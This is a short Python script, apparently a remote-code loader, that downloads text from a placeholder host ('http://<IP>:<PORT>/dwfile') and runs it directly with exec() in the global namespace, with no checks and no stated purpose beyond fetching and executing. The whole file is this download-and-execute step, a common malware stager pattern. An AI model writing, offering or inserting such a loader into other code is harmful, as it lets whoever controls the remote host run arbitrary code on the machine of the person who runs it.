import requests
def d_a_e(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        script_content = response.text

        exec(script_content, globals())

    except requests.exceptions.RequestException as e:
        print(f"error occurred in downloading : {e}")
    except Exception as e:
        print(f"error occured in executing: {e}")


script_url='http://<IP>:<PORT>/dwfile'
d_a_e(script_url)
